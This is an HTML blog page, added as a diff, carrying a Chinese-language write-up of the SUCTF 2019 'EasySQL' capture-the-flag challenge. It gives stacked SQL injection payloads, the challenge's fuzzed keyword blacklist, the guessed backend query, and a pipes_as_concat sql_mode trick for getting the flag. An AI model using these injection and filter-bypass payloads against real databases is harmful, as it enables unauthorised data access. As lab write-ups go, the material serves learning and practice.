@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>suctf2019-EasySQL - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,sql注入>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">suctf2019-EasySQL</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  
+
+  <div class="post-content">
+    <p>suctf2019的一道sql注入<br>buuoj上的环境：<a href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]EasySQL</a></p>
+<p>题目说</p>
+<blockquote>
+<p>Give me your flag, I will tell you if the flag is right. </p>
+</blockquote>
+<p>可以发现一些东西：</p>
+<ul>
+<li>输入除0外任何数字，返回Array ( [0] =&gt; 1 ) ，0返回空</li>
+<li>输入中带有字母，返回空</li>
+<li>存在堆叠注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
+返回<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; Flag )</span><br></pre></td></tr></table></figure>
+可以看到当前库只有一个Flag表</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">select</span> * <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+<p>返回Nonono.<br>可以想到是一些关键字被过滤了<br>fuzz可以发现过滤的关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;</span><br></pre></td></tr></table></figure>
+<p>from被过滤了，所以不能用之前强网杯预处理的方法(<a href="https://liotree.github.io/2019/08/13/%E9%9A%8F%E4%BE%BF%E6%B3%A8/">https://liotree.github.io/2019/08/13/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</a>)</p>
+<p>这时候可以通过前面的输入输出</p>
+<ul>
+<li>输入除0外任何数字，返回Array ( [0] =&gt; 1 ) ，0返回空</li>
+<li>输入中带有字母，返回空<br>去猜想后端的sql语句<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $<span class="keyword">query</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+拿flag有两个方法</li>
+<li>直接构造<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure></li>
+<li>mysql存在一个sql_mode,将其设为PIPE_AS_CONCAT可以将||的作用变为拼接字符串,详细可以参见<a href="https://www.cnblogs.com/mke2fs/p/11405531.html" target="_blank" rel="noopener">https://www.cnblogs.com/mke2fs/p/11405531.html</a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-08-27</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
